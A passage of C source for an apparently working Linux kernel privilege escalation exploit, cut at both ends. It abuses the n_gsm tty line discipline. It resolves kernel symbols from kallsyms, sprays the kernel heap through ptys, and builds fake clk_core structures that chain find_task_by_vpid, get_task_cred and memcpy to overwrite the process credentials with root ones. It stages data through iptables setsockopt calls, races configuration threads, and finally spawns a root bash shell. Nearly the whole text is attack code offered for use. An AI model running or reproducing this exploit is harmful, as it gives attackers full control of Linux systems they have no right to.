    kallsym_memcpy = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "memcpy");
    if (kallsym_memcpy == NULL)
    {
        fprintf(stderr, "Error not found memcpy in parsed kallsyms \n");
        goto error_memcpy;
    }

    kallsym_get_task_cred = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, "get_task_cred");
    if (kallsym_get_task_cred == NULL)
    {
        fprintf(stderr, "Error not found get_task_cred in parsed kallsyms \n");
        goto error_get_task_cred;
    }

    lockdep_map_size     += kallsym_lock_contended         != NULL ? 16 : 0;               // + cpu + ip
    spinlock_t_size      += kallsym_rwlock_init            != NULL ? 16 : 0;               // + magic + owner_cpu + owner
    spinlock_t_size      += kallsym_lockdep_sys_exit_thunk != NULL ? lockdep_map_size : 0; // + dep_map
    mutex_size           += spinlock_t_size;                                               // + waitlock
    mutex_size           += kallsym_mutex_spin_on_owner    != NULL ? 4 : 0;                // + osq
    mutex_size           += kallsym_mutex_destroy          != NULL ? 8 : 0;                // + magic
    mutex_size           += kallsym_lockdep_sys_exit_thunk != NULL ? lockdep_map_size : 0; // + dep_map

    gsm_mux_event_offset += 8; //tty
    gsm_mux_event_offset += spinlock_t_size; //lock
    gsm_mux_event_offset += mutex_size; //mutex
    gsm_mux_event_offset += 4; //num
    gsm_mux_event_offset += 4; //ref
    gsm_mux_event_offset += spinlock_t_size; // wait_event_head_lock

    printf("lockdep_map_size     -> %d \n", lockdep_map_size);
    printf("spinlock_t_size      -> %d \n", spinlock_t_size);
    printf("mutex_size           -> %d \n", mutex_size);
    printf("gsm_mux_event_offset -> %d \n", gsm_mux_event_offset);

    memset(heap_data, 0xFF, sizeof(heap_data));
    memset(&kernfs_payload, 0xAA, offsetofs(struct kernfs_scheme, end));

    gsm_addr = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, wait_event_data);
    gsm_mux_heap            = (uint64_t*) heap_data;
    *gsm_mux_heap           = gsm_addr - sizeof(uint64_t);

    offset_entry            = offsetofs(struct wait_entry_clk_core, entry);
    wait_event_list         = (struct list_head*) &kernfs_payload.wait_event_data[gsm_mux_event_offset];
    wait_event_list->next   = kallsym_kernfs_pr_cont_buf->address + offset_entry;
    wait_event_list->prev   = 0xdeadbeafdeadbeaf;

    offset_hw               = offsetofs(struct clk_core, hw);
    offset_rate             = offsetofs(struct clk_core, rate);
    offset_recalc_rate      = offsetofs(struct clk_core, of_node_recalc_rate);
    offset_ops              = offset_recalc_rate - CLK_OPS_OFFSET;

    clk_entry               = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, start);
    entry_end               = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, end);
    find_pid_addr           = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, find_pid);
    get_cred_addr           = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, get_cred);
    set_arg_cred_addr       = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, set_arg_cred);
    set_arg_memcpy_addr     = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, set_arg_memcpy);
    memcpy_cred_addr        = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, memcpy_cred);
    root_cred_addr          = kallsym_kernfs_pr_cont_buf->address + offsetofs(struct kernfs_scheme, root_cred);

    kernfs_payload.end.flags = ~WQ_FLAG_BOOKMARK;
    kernfs_payload.end.func  = kallsym_clk_nodrv_prepare_enable->address;

    kernfs_payload.start.new_parent                            = 0;
    kernfs_payload.start.parent                                = 0;
    kernfs_payload.start.rpm_enabled                           = false;
    kernfs_payload.start.flags_clk_core                        = 0;
    kernfs_payload.start.notifier_count                        = 0;
    kernfs_payload.start.children                              = 0;
    kernfs_payload.start.of_node_recalc_rate                   = 0;
    kernfs_payload.start.req_rate_set_rate                     = 0;
    kernfs_payload.start.flags                                 = ~WQ_FLAG_BOOKMARK;
    kernfs_payload.start.private_ops                           = clk_entry + offset_ops;
    kernfs_payload.start.func                                  = kallsym_clk_change_rate->address;
    kernfs_payload.start.entry.next                            = entry_end + offset_entry;
    kernfs_payload.start.new_child                             = find_pid_addr;

    kernfs_payload.find_pid.new_parent                         = 0;
    kernfs_payload.find_pid.parent                             = 0;
    kernfs_payload.find_pid.rpm_enabled                        = false;
    kernfs_payload.find_pid.flags                              = 0;
    kernfs_payload.find_pid.req_rate_set_rate                  = 0;
    kernfs_payload.find_pid.notifier_count                     = 0;
    kernfs_payload.find_pid.children                           = 0;
    kernfs_payload.find_pid.hw                                 = getpid();
    kernfs_payload.find_pid.ops                                = find_pid_addr + offset_ops;
    kernfs_payload.find_pid.of_node_recalc_rate                = kallsym_find_task_by_vpid->address;
    kernfs_payload.find_pid.new_child                          = set_arg_cred_addr;

    kernfs_payload.set_arg_cred.new_parent                     = 0;
    kernfs_payload.set_arg_cred.rpm_enabled                    = false;
    kernfs_payload.set_arg_cred.flags                          = 0;
    kernfs_payload.set_arg_cred.of_node_recalc_rate            = 0;
    kernfs_payload.set_arg_cred.notifier_count                 = 0;
    kernfs_payload.set_arg_cred.children                       = 0;
    kernfs_payload.set_arg_cred.rate                           = 8;
    kernfs_payload.set_arg_cred.parent                         = set_arg_cred_addr;
    kernfs_payload.set_arg_cred.hw                             = get_cred_addr + offset_hw;
    kernfs_payload.set_arg_cred.new_rate                       = find_pid_addr + offset_rate;
    kernfs_payload.set_arg_cred.ops                            = set_arg_cred_addr + offset_ops;
    kernfs_payload.set_arg_cred.req_rate_set_rate              = kallsym_memcpy->address;
    kernfs_payload.set_arg_cred.new_child                      = get_cred_addr;


    kernfs_payload.get_cred.new_parent                         = 0;
    kernfs_payload.get_cred.parent                             = 0;
    kernfs_payload.get_cred.rpm_enabled                        = false;
    kernfs_payload.get_cred.flags                              = 0;
    kernfs_payload.get_cred.req_rate_set_rate                  = 0;
    kernfs_payload.get_cred.notifier_count                     = 0;
    kernfs_payload.get_cred.children                           = 0;
    kernfs_payload.get_cred.ops                                = get_cred_addr + offset_ops;
    kernfs_payload.get_cred.of_node_recalc_rate                = kallsym_get_task_cred->address;
    kernfs_payload.get_cred.new_child                          = set_arg_memcpy_addr;

    kernfs_payload.set_arg_memcpy.new_parent                   = 0;
    kernfs_payload.set_arg_memcpy.rpm_enabled                  = false;
    kernfs_payload.set_arg_memcpy.flags                        = 0;
    kernfs_payload.set_arg_memcpy.of_node_recalc_rate          = 0;
    kernfs_payload.set_arg_memcpy.notifier_count               = 0;
    kernfs_payload.set_arg_memcpy.children                     = 0;
    kernfs_payload.set_arg_memcpy.rate                         = 8;
    kernfs_payload.set_arg_memcpy.parent                       = set_arg_memcpy_addr;
    kernfs_payload.set_arg_memcpy.hw                           = memcpy_cred_addr + offset_hw;
    kernfs_payload.set_arg_memcpy.new_rate                     = get_cred_addr + offset_rate;
    kernfs_payload.set_arg_memcpy.ops                          = set_arg_cred_addr + offset_ops;
    kernfs_payload.set_arg_memcpy.req_rate_set_rate            = kallsym_memcpy->address;
    kernfs_payload.set_arg_memcpy.new_child                    = memcpy_cred_addr;

    kernfs_payload.memcpy_cred.new_parent                      = 0;
    kernfs_payload.memcpy_cred.rpm_enabled                     = false;
    kernfs_payload.memcpy_cred.flags                           = 0;
    kernfs_payload.memcpy_cred.of_node_recalc_rate             = 0;
    kernfs_payload.memcpy_cred.notifier_count                  = 0;
    kernfs_payload.memcpy_cred.children                        = 0;
    kernfs_payload.memcpy_cred.rate                            = sizeof(struct cred_compact);
    kernfs_payload.memcpy_cred.parent                          = memcpy_cred_addr;
    kernfs_payload.memcpy_cred.new_rate                        = root_cred_addr;
    kernfs_payload.memcpy_cred.ops                             = set_arg_cred_addr + offset_ops;
    kernfs_payload.memcpy_cred.req_rate_set_rate               = kallsym_memcpy->address;
    kernfs_payload.memcpy_cred.new_child                       = 0;

    kernfs_payload.root_cred.usage             = 10000000;
    kernfs_payload.root_cred.uid.val           = 0;
    kernfs_payload.root_cred.gid.val           = 0;
    kernfs_payload.root_cred.suid.val          = 0;
    kernfs_payload.root_cred.sgid.val          = 0;
    kernfs_payload.root_cred.euid.val          = 0;
    kernfs_payload.root_cred.egid.val          = 0;
    kernfs_payload.root_cred.fsuid.val         = 0;
    kernfs_payload.root_cred.fsgid.val         = 0;
    kernfs_payload.root_cred.cap_effective     = CAP_FULL_SET;
    kernfs_payload.root_cred.cap_inheritable   = CAP_FULL_SET;
    kernfs_payload.root_cred.cap_bset.val      = 0;
    kernfs_payload.root_cred.cap_permitted.val = 0;
    kernfs_payload.root_cred.cap_ambient.val   = 0;

    args_sandbox_kern_buff.payload = (uint8_t*) &kernfs_payload;
    args_sandbox_kern_buff.size = sizeof(kernfs_payload);

    retval = pipe(heap_spray_pipe);
    if (retval != 0)
    {
        fprintf(stderr, "Error create pipe, %s \n", strerror(retval));
        goto error_create_pipe;
    }

    retval = pthread_barrier_init(&barrier_setconf, NULL, 2);
    if (retval != 0)
    {
        fprintf(stderr, "Error init delay barrier, %s \n", strerror(retval));
        goto error_barrier_setconf;
    }

    retval = pthread_barrier_init(&barrier_delay, NULL, MAX_HOLD_THREADS + 1);
    if (retval != 0)
    {
        fprintf(stderr, "Error init delay barrier, %s \n", strerror(retval));
        goto error_barrier_init_delay;
    }

    retval = pthread_attr_init(&tattr_alloc_dlci);
    if (retval != 0)
    {
        fprintf(stderr, "Error init attribute for alloc thread, %s \n", strerror(retval));
        goto error_init_attr_alloc;
    }

    retval = pthread_attr_setaffinity_np(&tattr_alloc_dlci, sizeof(cpu_set_t), &core_alloc_dlci);
    if (retval != 0)
    {
        fprintf(stderr, "Error set attribute affinity for alloc thread, %s \n", strerror(retval));
        goto error_set_attrs;
    }

    args_heap_spray = calloc(thread_spray_permisiible, sizeof(targs_alloc_kheap));
    if (args_heap_spray == NULL)
    {
        fprintf(stderr, "Error allocate heap spray thread args, %s \n", strerror(errno));
        goto error_alloc_heap_spray;
    }

    sandbox_stack = malloc(STACK_SIZE_SANDBOX);
    if (sandbox_stack == NULL)
    {
        fprintf(stderr, "Error allocate stack for sandbox ipconfig, %s \n", strerror(errno));
        goto error_alloc_sender_stack;
    }

    explotation_stack = malloc(STACK_SIZE_EXPLOTATION);
    if (explotation_stack == NULL)
    {
        fprintf(stderr, "Error allocate stack for explotation proccess, %s \n", strerror(errno));
        goto error_alloc_fake_write_stack;
    }

    pid_sandbox = clone(thread_sender_kern_buff,
                               sandbox_stack + STACK_SIZE_SANDBOX,
                               clone_flags_sandbox,
                               &args_sandbox_kern_buff,
                               0, 0, 0);
    if (pid_sandbox < 0)
    {
        fprintf(stderr, "Error create sanbox %s \n", strerror(errno));
        goto error_sandbox_sender;
    }

    retval = waitpid(pid_sandbox, &proccess_ret, __WCLONE);
    if (retval < 0 )
    {
        fprintf(stderr, "Error wait sandbox clone thread, %s \n", strerror(errno));
        goto error_sandbox_sender;
    }

    retval = WEXITSTATUS(proccess_ret);
    if (retval != 0)
    {
        const char* sandbox_error = sandbox_str_error(args_sandbox_kern_buff.result.error);
        int number = args_sandbox_kern_buff.result.error_number;
        fprintf(stderr, "Error in sandbox, where %s and type %s \n", sandbox_error, strerror(number));
        goto error_sandbox_sender;
    }

    retval = openpty(&fd_output, &fd_input, NULL, NULL, NULL);
    if (retval != 0)
    {
        fprintf(stderr, "Error create emulation tty, %s \n", strerror(errno));
        goto error_create_emu_tty;
    }

    retval = ioctl(fd_input, TIOCSETD, &ldisc);
    if (retval != 0)
    {
       fprintf(stderr, "Error set line discipline N_GSM, %s \n", strerror(errno));
       goto error_set_line_dspline;
    }

    args_setconf.fd_input = fd_input;
    retval = pthread_create(&tid_setconf, NULL, thread_gsm_setconf, &args_setconf);
    if (retval != 0)
    {
        fprintf(stderr, "Error create init setconf thread, %s \n", strerror(retval));
        goto error_init_setconf_thread;
    }

    pthread_barrier_wait(&barrier_setconf);

    retval = pthread_join(tid_setconf, NULL);
    if (retval != 0)
    {
        fprintf(stderr, "Error thread join to init setconf gsm %s \n", strerror(retval));
        goto error_init_setconf_thread;
    }
    else if (args_setconf.retval != 0)
    {
        fprintf(stderr, "Error ioctl in init setconf thread %s \n", strerror(args_setconf.error));
        goto error_init_setconf_thread;
    }

    args_setconf.config->mtu++;
    retval = pthread_create(&tid_setconf, &tattr_alloc_dlci, thread_gsm_setconf, &args_setconf);
    if (retval != 0)
    {
        fprintf(stderr, "Error create init setconf thread, %s \n", strerror(retval));
    }

    int fd_tmp = 0;
    for (int i = 0; i < thread_spray_permisiible; ++i)
    {
        args_heap_spray[i].data = heap_data;
        args_heap_spray[i].wait_fd = heap_spray_pipe[0];
        args_heap_spray[i].count_threads = &thread_spray_count;

        retval = openpty(&fd_tmp, &args_heap_spray[i].spray_fd, NULL, NULL, NULL);
        if (retval != 0)
        {
            fprintf(stderr, "Error create spray pty, %s \n", strerror(errno));
            goto error_create_spray_pty;
        }

        retval = pthread_create(&tids_spray_dlci[i], &tattr_alloc_dlci, thread_alloc_kheap, &args_heap_spray[i]);
        if (retval != 0)
        {
            fprintf(stderr, "Error create heap spray thread, %s \n", strerror(retval));
            goto error_create_spray_thread;
        }
    }
    SPIN_WAIT_CONDITION(thread_spray_count , thread_spray_permisiible);

    for (int i = 0; i < MAX_HOLD_THREADS; ++i)
    {
        retval = pthread_create(&tid_hold[i], &tattr_alloc_dlci, thread_hold, &args_hold);
        if (retval != 0)
        {
            fprintf(stderr, "Error create hold thread, %s \n", strerror(retval));
            goto error_setconf_thread;
        }
    }
    SPIN_WAIT_CONDITION(args_hold.count_threads, MAX_HOLD_THREADS);

    args_explotation.fd    = fd_input;
    args_explotation.data  = control_msg;
    args_explotation.count = sizeof(control_msg);
    args_explotation.cpu   = core_alloc_dlci;

    get_raw_msg(control_msg, 1, SABM | PF);

    pid_explotation = clone(thread_explotation,
                           explotation_stack + STACK_SIZE_EXPLOTATION,
                           clone_flags_explotation,
                           &args_explotation,
                           0, 0, 0);

    if (pid_explotation < 0)
    {
        fprintf(stderr, "Error create fake write proccess %s \n", strerror(errno));
        goto error_thread_explotation;
    }

    skip_msg(fd_output);
    skip_msg(fd_output);
    pthread_barrier_wait(&barrier_delay);

    spin_wait_proccess_state(pid_explotation, -1, RUNNING);
    pthread_barrier_wait(&barrier_setconf);

    wait_del_file("/dev/", "gsmtty63");
    spin_wait_proccess_state(getpid(), args_setconf.tid, UNINTERUPT_WAITING);
    write(heap_spray_pipe[1], tmp_array, thread_spray_permisiible);

    SPIN_WAIT_CONDITION(thread_spray_count, 0);
    printf("Let go thread \n");
    args_hold.is_hold = false;

    waitpid(pid_explotation, &proccess_ret, __WCLONE);

    if (args_explotation.error != EXPLOTATION_SUCCES)
    {
        const char* fake_write_error = fake_write_str_error(args_explotation.error);
        int number = args_explotation.ret_errno;
        fprintf(stderr, "Error in explotation thread, where %s and errno %s \n", fake_write_error, strerror(number));
    }

    retval = pthread_join(tid_setconf, NULL);
    if (retval != 0)
    {
        fprintf(stderr, "Error thread join to setconf thread %s \n", strerror(retval));
        goto error_setconf_thread;
    }
    else if (args_setconf.retval != 0)
    {
        fprintf(stderr, "Error ioctl in setconf thread %s \n", strerror(args_setconf.error));
        goto error_setconf_thread;
    }

    if (getuid() != 0)
    {
        fprintf(stderr, "Error faild get root  \n");
        goto error_fail_root;
    }


    for (int i = 0; i < thread_spray_permisiible; ++i)
    {
        close(args_heap_spray[i].spray_fd);
    }

    printf("We get root, spawn shell \n");
    execve("/bin/bash", newargv, newenviron);
    exit_code_main = EXIT_SUCCESS;

    error_fail_root:

    error_setconf_thread:

    error_thread_explotation:

    error_init_setconf_thread:

    error_create_spray_thread:

    error_create_spray_pty:

    error_set_line_dspline:

    close(fd_output);
    close(fd_input);
    error_create_emu_tty:

    error_sandbox_sender:

    free(explotation_stack);
    error_alloc_fake_write_stack:

    free(sandbox_stack);
    error_alloc_sender_stack:

    error_alloc_heap_spray:

    error_set_attrs:

    pthread_attr_destroy(&tattr_alloc_dlci);
    error_init_attr_alloc:

    error_barrier_init_delay:

    error_barrier_setconf:

    error_create_pipe:

    error_get_task_cred:

    error_memcpy:

    error_find_task_by_vpid:

    error_clk_nodrv_prepare_enable:

    error_clk_change_rate:

    error_find_kernfs_pr_cont_buf:

    error_find_startup_xen:

    error_find_kallsyms_offsets:

    error_find_xen_note:

    error_read_kernel_notes:

    free(kernel_file_notes);
    error_alloc_kernel_notes:

    error_get_kernel_notes_file_stat:

    close(kernel_notes_fd);
    error_open_kernel_notes:

    error_payload_not_elf:

    error_decompress:

    free(kernel_payload);
    error_alloc_kernel_payload:

    error_unknow_paload_format:

    error_check_boot_flag:

    munmap(prekernel_mmaped_file, prekernel_file_stat.st_size);
    error_mmap_kernel_file:

    error_get_kernel_file_stat:

    close(prekernel_file_fd);
    error_open_kernel:

    error_get_kernel_path:

    error_read_kernel_path:

    close(proc_cmdline_fd);
    error_open_cmdline:

    error_get_flag:
    cap_free(self_capability);

    error_cap_proc:

    error_read_event_paranoid:

    close(perf_event_paranoid_fd);
    error_open_event_paranoid:

    error_read_kptr:

    close(kptr_restrict_fd);
    error_open_kptr:

    free(kallsyms);
    error_parse_kallsyms:

    close(proc_kallsyms_fd);
    error_kallsyms_not_exist:

    error_pty_max_value:

    error_read_pty_max:

    close(pty_max_fd);
    error_pty_max:

    return exit_code_main;
}

void wait_del_file(char* directory, char* file_name)
{
    char buffer[4096];
    bool condition = false;
    const struct inotify_event *event;

    int fd_inotify = inotify_init();
    if (fd_inotify < 0)
    {
        perror("Error create inotify");
        return;
    }

    int fd_watch = inotify_add_watch(fd_inotify, directory, IN_DELETE);
    if (fd_watch < 0)
    {
        perror("Error add watch");
        return;
    }

    do {
        int len = read(fd_inotify, buffer, sizeof(buffer));

        for (char* ptr = buffer; ptr < buffer + len; ptr += sizeof(struct inotify_event) + event->len)
        {
            event = (const struct inotify_event *) ptr;

            if (!event->len)
                continue;

            if (!(event->mask & IN_ISDIR) && !strcmp(event->name, file_name))
            {
                condition = true;
                break;
            }
        }
    } while (!condition);
}

static void spin_wait_proccess_state(pid_t pid, pid_t tid, enum proccess_state wait_state)
{
    int read_size = 256;

    char path[PATH_MAX];
    char buffer[read_size];

    int fd = 0;
    int offset = 0;
    int lenght = 0;

    char* path_state = NULL;

    if (tid == -1)
        path_state = "/proc/%u/stat";
    else
        path_state = "/proc/%u/task/%u/stat";

    snprintf(path, sizeof(path), path_state, pid, tid);

    fd = open(path, O_RDONLY, 0);
    if (fd == -1)
        return;

    do {

        if (lseek(fd, offset, SEEK_SET) ==  (off_t) -1)
            break;

        if ((lenght = read(fd, buffer, read_size)) == -1)
            break;

        if (offset == 0)
        {
            for (int count = 2; offset < lenght && count != 0; ++offset)
                if (isspace(buffer[offset]))
                    --count;
            read_size = 1;
        }

    } while ((enum proccess_state) buffer[0] != wait_state);

    close(fd);
}

void* thread_hold(void* data)
{
    targs_hold* args = (struct  targs_hold*) data;

    args->count_threads++;
    pthread_barrier_wait(&barrier_delay);
    while (args->is_hold);

    return NULL;
}

void* thread_gsm_setconf(void* data)
{
    targs_setconf* args = (targs_setconf*) data;
    args->tid = syscall(SYS_gettid);

    pthread_barrier_wait(&barrier_setconf);

    args->retval = ioctl(args->fd_input, GSMIOC_SETCONF, args->config);
    args->error = errno;
    return NULL;
}

int thread_explotation(void* data)
{
    struct sched_param params;
    targs_fake_input* args = (targs_fake_input*) data;

    sched_setaffinity(0, sizeof(args->cpu), &args->cpu);

    memset(&params, 0, sizeof(params));
    sched_setscheduler(0, SCHED_IDLE, &params);

    if (setsid() == (pid_t) -1)
    {
        args->error = CREATE_SESSION_ERROR;
        args->ret_errno = errno;
        return -1;
    }

    if (ioctl(args->fd, TIOCSCTTY) != 0)
    {
        args->error = SET_PROCCESS_TTY_ERROR;
        args->ret_errno = errno;
        return -1;
    }

    for (int i = 0; i < args->count; ++i)
    {
        if (ioctl(args->fd, TIOCSTI, &args->data[i]) != 0)
        {
            args->error = FAKE_INPUT_ERROR;
            args->ret_errno = errno;
            return -1;
        }
    }

    args->error = EXPLOTATION_SUCCES;
    args->ret_errno = errno;
    return 0;
}

void* thread_alloc_kheap(void* data)
{
    char tmp;
    targs_alloc_kheap* args = (targs_alloc_kheap*) data;

    (*args->count_threads)++;
    read(args->wait_fd, &tmp, 1);

    write(args->spray_fd, args->data, HEAP_SPRAY_SIZE - 1);
    (*args->count_threads)--;
    return NULL;
}

static void skip_msg(int fd)
{
    unsigned char tmp_c;
    int sofs = 0;

    while(sofs != 2)
    {
        read(fd, &tmp_c, 1);
        if(tmp_c == GSM0_SOF) sofs++;
    }
}

static unsigned char gsm_fcs_add_block(unsigned char fcs, unsigned char *c, int len)
{
    while (len--)
    fcs = gsm_fcs8[fcs ^ *c++];
    return fcs;
}

static void get_raw_msg(uint8_t* buffer, uint8_t addr, uint8_t control)
{
    buffer[0] = GSM0_SOF;
    buffer[1] = (addr << 2) | CR_BIT | EA;
    buffer[2] = control;
    buffer[3] = EA;
    buffer[4] = 0xFF - gsm_fcs_add_block(INIT_FCS, &buffer[1], 3);
    buffer[5] = GSM0_SOF;
}

int get_part_of_static_payload(uint8_t* dst, uint8_t* src, int index)
{
    int len = 0;
    for (;index > -1 && src[index] != 0; --index, ++len);

    if (len != 0)
    {
        memcpy(&dst[index + 1], &src[index + 1], len);
        ++len;
    }
    else if (index > 0)
    {
        --index;
        ++len;
    }

    if (index < 0)
        index = 0;
    else
        memset(dst, 0xd, index + 1);

    dst[index + len] = 0;
    return index;
}

int thread_sender_kern_buff(void *data)
{
    int sock = 0;
    int lenght = 0;
    int ret = 0;
    int index = 0;

    uint16_t size_entry = sizeof(struct ipt_entry) +
                          sizeof(struct xt_entry_match) +
                          sizeof(struct xt_cgroup_info_v1) +
                          sizeof(struct xt_standard_target);
    uint16_t target_offset = size_entry - sizeof(struct xt_standard_target);
    uint16_t target_size   = sizeof(struct xt_standard_target);
    uint16_t match_size    = sizeof(struct xt_entry_match) + sizeof(struct xt_cgroup_info_v1);

    uint8_t tmp_buffer[4096];

    struct xt_counters counter = {0,0};
    struct {
        struct ipt_replace replace;
        struct ipt_entry entry;
        struct xt_entry_match entry_math;
        struct xt_cgroup_info_v1 cgroup_info;
        struct xt_standard_target entry_target;
    } payload_xgcroup;

    payload_xgcroup.replace.num_counters = 1;
    payload_xgcroup.replace.num_entries = 1;
    payload_xgcroup.replace.counters = &counter;
    payload_xgcroup.replace.size = size_entry;
    payload_xgcroup.replace.valid_hooks = 0;

    payload_xgcroup.entry.target_offset = target_offset;
    payload_xgcroup.entry.next_offset = size_entry;
    payload_xgcroup.entry.ip.flags = 0;
    payload_xgcroup.entry.ip.invflags = 0;

    payload_xgcroup.entry_math.u.user.revision = 1;
    payload_xgcroup.entry_math.u.match_size = match_size;
    sprintf(payload_xgcroup.entry_math.u.user.name, "cgroup");

    payload_xgcroup.entry_target.target.u.target_size = target_size;
    payload_xgcroup.entry_target.verdict = 1;

    payload_xgcroup.cgroup_info.invert_path = 1;
    payload_xgcroup.cgroup_info.invert_classid = 1;
    payload_xgcroup.cgroup_info.has_classid = 0;
    payload_xgcroup.cgroup_info.has_path = 1;

    targs_sender_kern_buff* args = (targs_sender_kern_buff*) data;
    index = args->size;
    args->result.error = 0;
    args->result.error_number = 0;

    if (index < 1)
        return 0;

    if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        args->result.error = SANDBOX_ERROR_SOCKET;
        args->result.error_number = errno;
        return -1;
    }

    do {
        index = get_part_of_static_payload(tmp_buffer, args->payload, index);
        lenght = strlen((char*) tmp_buffer);

        memcpy(&payload_xgcroup.cgroup_info.path, tmp_buffer, lenght + 1);
        ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, &payload_xgcroup, sizeof(struct ipt_replace));

        if (ret < 0 && errno != EINVAL)
        {
            args->result.error = SANDBOX_ERROR_SETSOCKOPT;
            args->result.error_number = errno;
            return -1;
        }
    } while (index > 0);

    return 0;
}

const compress_format* get_prekernel_payload_type(uint8_t* payload)
{
    int i = 0;
    for (i = 0; compressed_formats[i].name; ++i)
    {
        if (!memcmp(payload, &compressed_formats[i].magic, 2))
            break;
    }

    return &compressed_formats[i];
}

bool is_elf_file(uint8_t* payload)
{
    const uint8_t ELF_MAGIC[] = {0x7f, 0x45, 0x4c, 0x46};
    return !memcmp(payload, ELF_MAGIC, 4);
}

parse_kallsyms_result parse_kallsyms_file(kallsym** array_pointer, int fd_kallsyms)
{
    int lines = 0;
    int retval = 0;
    kallsym* sym_list = NULL;
    parse_kallsyms_result result = {PARSE_KALLSYMS_SUCCES, 0};

    FILE* file_kallsyms = fdopen(fd_kallsyms, "r");
    if (file_kallsyms == NULL)
    {
        result.error = PARSE_KALLSYMS_FOPEN_ERROR;
        result.value = errno;
        return result;
    }

    while (!feof(file_kallsyms))
    {
        int ch = fgetc(file_kallsyms);
        if (ch == '\t')
            break;
        else if (ch == '\n')
            lines++;
    }
    rewind(file_kallsyms);

    if (lines < 1)
    {
        result.error = PARSE_KALLSYMS_DATA_ERROR;
        return result;
    }

    sym_list = (kallsym*) malloc(lines * sizeof(kallsym));
    if (sym_list == NULL)
    {
        result.error = PARSE_KALLSYMS_ALLOC_ERROR;
        result.value = errno;
        return result;
    }

    for (int i = 0; i < lines && !feof(file_kallsyms); ++i)
    {
        uint64_t* address = &sym_list[i].address;
        char* type = &sym_list[i].type;
        char* name_symbol = sym_list[i].name_symbol;

        retval = fscanf(file_kallsyms, "%lx %c %s", address, type, name_symbol);
        if (retval < 3)
        {
            free(sym_list);
            result.error = PARSE_KALLSYMS_READ_ERROR;
            result.value = errno;
            return result;
        }
    }

    *array_pointer = sym_list;
    result.value = lines;
    return result;
}


const char* parse_kallsyms_str_error(enum parse_kallsyms_error error_number)
{
    switch (error_number)
    {
    case PARSE_KALLSYMS_SUCCES:
        return "SUCCES";
    case PARSE_KALLSYMS_FOPEN_ERROR:
        return "ERROR OPEN FD OF KALLSYMS";
    case PARSE_KALLSYMS_DATA_ERROR:
        return "BAD DATA IN KALLSYMS FILE";
    case PARSE_KALLSYMS_ALLOC_ERROR:
        return "ERROR ALLOC MEMORY FOR KALLSYMS ARRAY";
    case PARSE_KALLSYMS_READ_ERROR:
        return "ERROR READ KALLSYMS FILE";
    default:
        return "UNKNOW";
    }
}

const char* sandbox_str_error(enum sandbox_error error_number)
{
    switch (error_number)
    {
    case SANDBOX_SUCCES:
        return "SUCCES";
    case SANDBOX_ERROR_SOCKET:
        return "ERROR SOCKET";
    case SANDBOX_ERROR_SETSOCKOPT:
        return "ERROR SETSOCKOPT";
    default:
        return "UNKNOW";
    }
}

const char* fake_write_str_error(enum fake_write_error error_number)
{
    switch (error_number)
    {
    case EXPLOTATION_SUCCES:
        return "SUCCES";
    case CREATE_SESSION_ERROR:
        return "ERROR SESSION CREATE";
    case SET_PROCCESS_TTY_ERROR:
        return "ERROR SET TTY";
    case FAKE_INPUT_ERROR:
        return "ERROR FAKE INPUT";
    default:
        return "UNKNOW";
    }
}


static inline const void* get_descript_elf_note(Elf64_Nhdr* note)
{
    return note->n_descsz == 0 ? NULL : (uint8_t*) note + sizeof(*note) + ALIGN_UP(note->n_namesz, 4);
}

static inline const char* get_name_elf_note(Elf64_Nhdr* note)
{
    return note->n_namesz == 0 ? NULL : (const char*) note + sizeof(*note);
}

static inline Elf64_Nhdr* get_next_elf_note(Elf64_Nhdr* note)
{
    return (Elf64_Nhdr*) ((uint8_t*) note + sizeof(*note) + ALIGN_UP(note->n_namesz, 4) + ALIGN_UP(note->n_descsz, 4));
}

static inline void *offset_to_ptr(const int *off)
{
    return (void *)((unsigned long)off + *off);
}

static inline void resolve_base_kallsyms(kallsym* kallsyms, const int kallsyms_lenght, uint64_t text_address)
{
    for (int i = 0; i < kallsyms_lenght; ++i)
    {
        kallsym* sym = &kallsyms[i];
        if (sym->type != ABSOLUTE_ADDRESS)
            sym->address += text_address;
    }
}

static inline kallsym* find_symbol_from_kallsyms(kallsym* kallsyms, const int kallsyms_lenght, const char* symbol_name)
{
    for (int i = 0; i < kallsyms_lenght; ++i)
    {
        if (!strcmp(kallsyms[i].name_symbol, symbol_name))
            return &kallsyms[i];
    }

    return NULL;
}

inline int offset_of(void* p1, void* p2)
{
    return (uint8_t*)p1 - (uint8_t*)p2;
}

enum find_kallsyms_offsets_error find_kallsyms_offsets(const uint8_t* kernel, kallsym* kallsyms, int kallsyms_lenght)
{
    int ksymtab_lenght = 0;
    bool is_not_finded = true;
    const uint8_t* kernel_text = NULL;
    const uint8_t* kernel_rodata = NULL;
    const int32_t* kernel_kallsyms_offsets = NULL;
    const struct kernel_symbol* ksymtab = NULL;

    Elf64_Ehdr* ehdr = (Elf64_Ehdr*) kernel;
    Elf64_Shdr* shdr = (Elf64_Shdr*) (kernel + ehdr->e_shoff);
    Elf64_Shdr* shdr_shstrtab = shdr + ehdr->e_shstrndx;
    Elf64_Shdr* shdr_iterator = shdr;
    Elf64_Shdr* shdr_ksymtab = NULL;
    Elf64_Shdr* shdr_rodata = NULL;
    Elf64_Shdr* shdr_text = NULL;

    char* sh_strtab = (char*) (kernel + shdr_shstrtab->sh_offset);

    while (shdr + ehdr->e_shnum >= shdr_iterator)
    {
        if (!strcmp(sh_strtab + shdr_iterator->sh_name, "__ksymtab"))
            shdr_ksymtab = shdr_iterator;
        else if (!strcmp(sh_strtab + shdr_iterator->sh_name, ".text"))
            shdr_text = shdr_iterator;
        else if (!strcmp(sh_strtab + shdr_iterator->sh_name, ".rodata"))
            shdr_rodata = shdr_iterator;

        ++shdr_iterator;
    }

    if (shdr_ksymtab == NULL)
        return FIND_KALLSYMS_KSYMTAB_ERROR;
    else if (shdr_text == NULL)
